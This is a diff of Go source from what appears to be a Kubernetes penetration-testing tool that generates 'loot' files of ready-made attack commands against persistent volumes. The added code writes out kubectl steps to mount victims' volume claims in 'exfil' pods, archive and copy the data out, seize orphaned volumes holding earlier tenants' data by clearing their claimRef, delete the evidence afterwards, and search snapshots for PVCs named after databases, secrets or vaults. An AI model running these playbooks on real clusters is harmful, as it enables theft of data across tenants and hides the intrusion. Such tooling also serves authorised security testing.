+			Add("# Step 4: Mount and exfiltrate").
+			Addf(`cat <<'EOF' | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: snapshot-exfil-%s
+  namespace: %s
+spec:
+  containers:
+  - name: exfil
+    image: alpine
     command: ["sleep", "3600"]
     volumeMounts:
     - name: data
@@ -1606,81 +1901,146 @@ spec:
   volumes:
   - name: data
     persistentVolumeClaim:
-      claimName: %s
-EOF`, inspectorName, finding.PVCNamespace, finding.PVCName))
-		*lootDataAccess = append(*lootDataAccess, fmt.Sprintf("kubectl exec -it pvc-inspector-%s -n %s -- sh", inspectorName, finding.PVCNamespace))
-		*lootDataAccess = append(*lootDataAccess, fmt.Sprintf("# List files: kubectl exec pvc-inspector-%s -n %s -- ls -laR /data", inspectorName, finding.PVCNamespace))
-		*lootDataAccess = append(*lootDataAccess, fmt.Sprintf("# Copy data: kubectl cp %s/pvc-inspector-%s:/data ./pvc-data-%s", finding.PVCNamespace, inspectorName, finding.PVCName))
-		*lootDataAccess = append(*lootDataAccess, fmt.Sprintf("# Cleanup: kubectl delete pod pvc-inspector-%s -n %s", inspectorName, finding.PVCNamespace))
-		*lootDataAccess = append(*lootDataAccess, "")
+      claimName: %s-exfil
+EOF`, finding.PVCName, ns, finding.PVCName).
+			Add("#").
+			Add("# Step 5: Copy data").
+			Addf("kubectl exec snapshot-exfil-%s -n %s -- tar czf /tmp/data.tar.gz /data", finding.PVCName, ns).
+			Addf("kubectl cp %s/snapshot-exfil-%s:/tmp/data.tar.gz ./snapshot-%s.tar.gz", ns, finding.PVCName, finding.PVCName).
+			Add("#").
+			Add("# Step 6: Cleanup").
+			Addf("kubectl delete pod snapshot-exfil-%s -n %s", finding.PVCName, ns).
+			Addf("kubectl delete pvc %s-exfil -n %s", finding.PVCName, ns).
+			Addf("kubectl delete volumesnapshot %s-snapshot -n %s", finding.PVCName, ns).
+			Add("")
 	}
 
-	// Attack paths
-	if len(finding.AttackPaths) > 0 {
-		*lootAttackPaths = append(*lootAttackPaths, fmt.Sprintf("\n# PV: %s - Risk: %s", finding.PVName, finding.RiskLevel))
-		for _, path := range finding.AttackPaths {
-			*lootAttackPaths = append(*lootAttackPaths, path)
-		}
-		*lootAttackPaths = append(*lootAttackPaths, "")
-	}
+	// 7. PV-Orphaned - Orphaned and Retain policy volumes
+	if finding.OrphanedVolume || finding.UnusedVolume || finding.ReclaimPolicy == "Retain" {
+		loot.Section("PV-Orphaned").
+			Addf("\n# ═══════════════════════════════════════════════════════════").
+			Addf("# PV: %s", finding.PVName).
+			Addf("# Status: %s", finding.Status).
+			Addf("# Reclaim Policy: %s", finding.ReclaimPolicy).
+			Addf("# ═══════════════════════════════════════════════════════════")
 
-	// Misconfigurations
-	if len(finding.SecurityIssues) > 0 {
-		*lootMisconfigurations = append(*lootMisconfigurations, fmt.Sprintf("\n# PV: %s", finding.PVName))
-		*lootMisconfigurations = append(*lootMisconfigurations, "# Security Issues:")
-		for _, issue := range finding.SecurityIssues {
-			*lootMisconfigurations = append(*lootMisconfigurations, "# - "+issue)
+		if finding.OrphanedVolume {
+			loot.Section("PV-Orphaned").
+				Add("#").
+				Add("# [ORPHANED] Volume was released - may contain previous tenant data").
+				Add("#").
+				Add("# Step 1: Remove claimRef to make volume Available:").
+				Addf("kubectl patch pv %s -p '{\"spec\":{\"claimRef\": null}}'", finding.PVName).
+				Add("#").
+				Add("# Step 2: Create PVC to claim the orphaned volume:").
+				Addf(`cat <<'EOF' | kubectl apply -f -
+apiVersion: v1
+kind: PersistentVolumeClaim
+metadata:
+  name: claim-orphaned-%s
+  namespace: default
+spec:
+  accessModes:
+    - ReadWriteOnce
+  resources:
+    requests:
+      storage: %s
+  volumeName: %s
+EOF`, finding.PVName, finding.Capacity, finding.PVName).
+				Add("#").
+				Add("# Step 3: Create inspector pod:").
+				Addf(`cat <<'EOF' | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: orphan-inspector-%s
+  namespace: default
+spec:
+  containers:
+  - name: inspector
+    image: alpine
+    command: ["sleep", "3600"]
+    volumeMounts:
+    - name: data
+      mountPath: /data
+  volumes:
+  - name: data
+    persistentVolumeClaim:
+      claimName: claim-orphaned-%s
+EOF`, finding.PVName, finding.PVName).
+				Add("#").
+				Add("# Step 4: Access old data:").
+				Addf("kubectl exec -it orphan-inspector-%s -- sh", finding.PVName).
+				Addf("kubectl exec orphan-inspector-%s -- find /data -type f | head -50", finding.PVName).
+				Add("#").
+				Add("# Cleanup:").
+				Addf("kubectl delete pod orphan-inspector-%s", finding.PVName).
+				Addf("kubectl delete pvc claim-orphaned-%s", finding.PVName)
 		}
-		*lootMisconfigurations = append(*lootMisconfigurations, "")
-	}
 
-	// Remediation
-	if len(finding.Recommendations) > 0 {
-		*lootRemediation = append(*lootRemediation, fmt.Sprintf("\n# PV: %s - Risk: %s", finding.PVName, finding.RiskLevel))
-		*lootRemediation = append(*lootRemediation, "# Recommendations:")
-		for _, rec := range finding.Recommendations {
-			*lootRemediation = append(*lootRemediation, "# "+rec)
+		if finding.UnusedVolume {
+			loot.Section("PV-Orphaned").
+				Add("#").
+				Add("# [UNBOUND] Volume is available - check for residual data").
+				Add("#").
+				Add("# Create PVC to claim and inspect:").
+				Addf(`cat <<'EOF' | kubectl apply -f -
+apiVersion: v1
+kind: PersistentVolumeClaim
+metadata:
+  name: claim-unbound-%s
+  namespace: default
+spec:
+  accessModes:
+    - ReadWriteOnce
+  resources:
+    requests:
+      storage: %s
+  volumeName: %s
+EOF`, finding.PVName, finding.Capacity, finding.PVName)
 		}
-		*lootRemediation = append(*lootRemediation, "")
+
+		if finding.ReclaimPolicy == "Retain" && !finding.OrphanedVolume && !finding.UnusedVolume {
+			loot.Section("PV-Orphaned").
+				Add("#").
+				Add("# [RETAIN POLICY] Volume will persist after PVC deletion").
+				Add("# Risk: Data remains accessible after application is removed").
+				Add("#").
+				Add("# To access data after PVC deletion:").
+				Add("# 1. Delete the PVC (data remains on volume):").
+				Addf("#    kubectl delete pvc %s -n %s", finding.PVCName, finding.PVCNamespace).
+				Add("# 2. Volume status changes to 'Released'").
+				Add("# 3. Remove claimRef:").
+				Addf("#    kubectl patch pv %s -p '{\"spec\":{\"claimRef\": null}}'", finding.PVName).
+				Add("# 4. Create new PVC to claim the volume with old data")
+		}
+
+		loot.Section("PV-Orphaned").Add("")
 	}
 }
 
 // generateSnapshotLoot enumerates volume snapshots
-func generateSnapshotLoot(ctx context.Context, clientset *kubernetes.Clientset, lootSnapshots *[]string) {
-	*lootSnapshots = append(*lootSnapshots, "\n# Enumerating VolumeSnapshots...")
-	*lootSnapshots = append(*lootSnapshots, "# Note: VolumeSnapshot is a CRD and may not be available in all clusters")
-	*lootSnapshots = append(*lootSnapshots, "")
-	*lootSnapshots = append(*lootSnapshots, "# Check if VolumeSnapshot CRD exists:")
-	*lootSnapshots = append(*lootSnapshots, "kubectl get crd volumesnapshots.snapshot.storage.k8s.io")
-	*lootSnapshots = append(*lootSnapshots, "")
-	*lootSnapshots = append(*lootSnapshots, "# List all VolumeSnapshots:")
-	*lootSnapshots = append(*lootSnapshots, "kubectl get volumesnapshots --all-namespaces")
-	*lootSnapshots = append(*lootSnapshots, "")
-	*lootSnapshots = append(*lootSnapshots, "# List VolumeSnapshotClasses:")
-	*lootSnapshots = append(*lootSnapshots, "kubectl get volumesnapshotclasses")
-	*lootSnapshots = append(*lootSnapshots, "")
-	*lootSnapshots = append(*lootSnapshots, "# Data exfiltration via snapshots:")
-	*lootSnapshots = append(*lootSnapshots, "# 1. Create snapshot: kubectl create volumesnapshot <name> --source-pvc=<target-pvc> -n <namespace>")
-	*lootSnapshots = append(*lootSnapshots, "# 2. Wait for ready: kubectl get volumesnapshot <name> -n <namespace>")
-	*lootSnapshots = append(*lootSnapshots, "# 3. Create PVC from snapshot:")
-	*lootSnapshots = append(*lootSnapshots, `# cat <<EOF | kubectl apply -f -
-# apiVersion: v1
-# kind: PersistentVolumeClaim
-# metadata:
-#   name: restored-data
-# spec:
-#   dataSource:
-#     name: <snapshot-name>
-#     kind: VolumeSnapshot
-#     apiGroup: snapshot.storage.k8s.io
-#   accessModes:
-#     - ReadWriteOnce
-#   resources:
-#     requests:
-#       storage: 10Gi
-# EOF`)
-	*lootSnapshots = append(*lootSnapshots, "# 4. Mount in pod and exfiltrate data")
-	*lootSnapshots = append(*lootSnapshots, "")
+func generateSnapshotLoot(ctx context.Context, clientset *kubernetes.Clientset, loot *shared.LootBuilder) {
+	loot.Section("PV-Snapshots").
+		Add("\n# ═══════════════════════════════════════════════════════════").
+		Add("# CLUSTER-WIDE SNAPSHOT ENUMERATION").
+		Add("# ═══════════════════════════════════════════════════════════").
+		Add("#").
+		Add("# Check if VolumeSnapshot CRD exists:").
+		Add("kubectl get crd volumesnapshots.snapshot.storage.k8s.io").
+		Add("#").
+		Add("# List all VolumeSnapshots:").
+		Add("kubectl get volumesnapshots --all-namespaces -o wide").
+		Add("#").
+		Add("# List VolumeSnapshotClasses:").
+		Add("kubectl get volumesnapshotclasses").
+		Add("#").
+		Add("# List VolumeSnapshotContents (cluster-scoped):").
+		Add("kubectl get volumesnapshotcontents").
+		Add("#").
+		Add("# Find snapshots of sensitive PVCs:").
+		Add("kubectl get volumesnapshots --all-namespaces -o json | jq -r '.items[] | select(.spec.source.persistentVolumeClaimName | test(\"db|database|secret|backup|vault\")) | \"\\(.metadata.namespace)/\\(.metadata.name) -> \\(.spec.source.persistentVolumeClaimName)\"'").
+		Add("")
 }
 
 // detectVolumeSource returns volume type, cloud volume ID, and provisioner
